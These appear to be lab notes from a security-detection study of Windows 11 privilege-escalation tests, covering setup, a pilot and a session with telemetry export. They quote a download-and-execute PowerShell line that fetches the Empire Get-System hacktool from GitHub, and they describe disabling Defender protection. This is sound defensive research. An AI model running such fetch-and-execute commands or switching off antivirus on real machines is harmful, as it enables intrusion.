# VM3 setup notes

Facts recorded while building and running VM3 ([VM3-RUNBOOK.md](VM3-RUNBOOK.md)), for the outcome
section of [docs/design/vm3-session.md](../../docs/design/vm3-session.md). Filled in as the session
proceeds; empty until then.

## Machine

- Base: **full clone of `CPES-Windows11-Lab12` @ `vm-live-v1-ready`** (2026-10-29). VM `CPES-Windows11-VM3`,
  user `cpeslab` ("CPES Lab"). Host-only IP **192.168.56.103**; USB off; clipboard and drag-and-drop disabled.
- Sysmon running, config hash `B58F8F5B…2373E2C8` (same v2 config). Audit *Security System Extension* = Success.
- Elasticsearch 9.4.3: the clone ran it by hand, so it was **installed as an auto-start Windows service** here
  (`elasticsearch-service-x64`) with a 2 GB heap cap (`jvm.options.d\heap.options`). Winlogbeat 9.4.3 repointed to
  index **`cpes-live-vm3`** (`winlogbeat setup --pipelines --index-management`, service restarted). The clone's old
  `cpes-live-v1` index stays on disk and is untouched (export reads `cpes-live-vm3` by time range).
- Preflight: **26 OK**, every UAC binary present including **`sdclt.exe`** and all ten test prerequisites; the only
  FAIL is "no internet route", which is expected while the setup NAT adapter is still on (clears in freeze).

## Token-offline shim

- Both T1134.001 tests run `IEX (IWR '<raw url>'); Get-System -Technique ...`. URL fetched and pinned during setup:
  `https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1`
  (26,498 chars), SHA-256 **`678ADADA054703A176940399C9CFB3EAA050C2FFDBAB8365CD60B6B714A99F22`**.
- `token-offline-profile.ps1` installed as `$PSHOME\Profile.ps1` with that pin; it serves the one URL from the local
  copy and passes every other request through. **`CPES-TokenScriptOk` = True** at freeze.
- **Defender notes.** Get-System.ps1 is a flagged hacktool: real-time protection quarantines it in-flight even with a
  folder exclusion, so during setup RT was turned off only for the fetch, `C:\CPES-session` was added to Defender
  exclusions (as `C:\AtomicRedTeam` already is), and RT was turned back **on** for the benign period
  (RealTimeProtectionEnabled = True at freeze). A guard bug in the first shim (setup's text-replace of the sentinel
  hit the guard check too, inverting it) was fixed before freeze: the guard now checks the pin length, not the
  sentinel literal.

## Pilot (throwaway)

- One round of ten tests, Defender off, `pilot-atomic-log.csv` (ten rows, all ExitCode 0). Slice exported to
  `pilot-corpus.ndjson` (**185,176** documents). `python -m evaluation.vm3 --pilot` result: **7 escalated, 3 did not.**
  Escalated: T1543.003 #2/#3, T1055.001 #1, **T1134.001 #1** (offline token shim → `WORKGROUP\SYSTEM`, W3's first
  completed token run), T1548.002 #3/#5/**#7 (sdclt)**. Did not: T1548.002 #1, T1134.001 #2, T1134.002 #1.
- Resolution — all three declared **"cannot complete here"** by the dated amendment in
  [`docs/design/vm3-session.md`](../../docs/design/vm3-session.md) (committed before the recorded session); none
  fixed by changing a test/detector/weight. Evidence in `pilot-master-log.txt`:
  - **T1548.002 #1 (eventvwr/mscfile):** commands ran at Medium; no High/System process in ±150 s — bypass patched
    on build 26200.9711.
  - **T1134.001 #2 (SeDebugPrivilege dup):** `OpenProcessToken`/`DuplicateToken`/`SetThreadToken` →
    `Win32Exception (0x80004005)`; in-thread, spawns no process.
  - **T1134.002 #1 (CreateProcessFromParent off lsass):** **"Access is denied"** — lsass is PPL on 26200.9711.
- Pilot environment fixes recorded as setup amendments: frozen build **26200.9711** (feature update applied during
  setup), `--paravirtprovider minimal` (guest-hang fix), recorded session starts from **`vm3-ready-postupdate`**.
- Revert to `vm3-ready-postupdate` before the recorded session: _pending (VM-side, before the real run)_.

## Recorded session

Ran 2026-10-29 / 2026-10-30 (the session spanned a **~6 h idle pause** between Part 1 and Part 2 —
the operator stepped away after the UAC part; the pause is benign idle time outside every test
window and does not affect the per-test analysis, only the corpus size).

- Benign period: **2026-10-29T17:48:20Z → 18:18:31Z** (30 min, Defender on), `benign-period.csv`.
- Defender real-time protection off at ~18:20Z: `RealTimeProtectionEnabled=False`, AntivirusEnabled
  True, BehaviorMonitor False, TamperProtected False (`defender-state-before-attacks.csv`). Re-verified
  **still False** after the 6 h pause, before Part 2.
- Part 1 (uac, non-admin): 20 runs, T1548.002 ×20, first run **2026-10-29T18:23:01Z**. No UAC consent
  dialog appeared (bypasses elevated silently or ran at Medium). Part 2 (admin, elevated): 30 runs —
  T1543.003 ×10, T1134.001 ×10, T1055.001 ×5, T1134.002 ×5; last run **2026-10-30T03:37:24Z**.
  **All 50 runs ExitCode 0.** Defender detections/threats: **none** (`defender-detections.csv` /
  `defender-threats.csv` both empty — RT was off, so Defender caught nothing).
- Export: `lab/export_live.py --name vm3 --start 2026-10-29T17:48:20Z --end 2026-10-30T03:47:24Z`
  (last run + 10 min) → **1,128,188 documents**, SHA-256
  **`964bdb6ed7315a0caf94b5826930be69d8296eb16a0872d49b29feccf79ce3b7`** (`vm3.CORPUS_SHA256` set).
  Event mix: EID 10 ProcessAccess 539,837; EID 12/13 registry 471,868; EID 1 ProcessCreate 1,020;
  EID 7 ImageLoad 38,751; EID 11 FileCreate 72,367; EID 8 CreateRemoteThread 3; EID 17/18 pipes 3,323;
  Security 4697 / System 7045 service installs 16 each.

## Analysis

- `python -m evaluation.run vm3`: execution `vm3-20261030T041508Z`. All six hypotheses **supported**
  (W1 35/35, W2 35/50, W3 5/5 completed token runs, W4 no differences, W5 45 vs 35, W6 10/10 & 0 FA).
  RESULTS §16, FINDINGS §13, CHANGELOG 0.4.0.
- Any disclosed correction: none — no test, detector, weight or hypothesis changed after the
  pre-registration. The ~6 h idle pause between Part 1 and Part 2 is disclosed above; it is benign time
  outside every test window and does not affect the per-test analysis, only the corpus size.
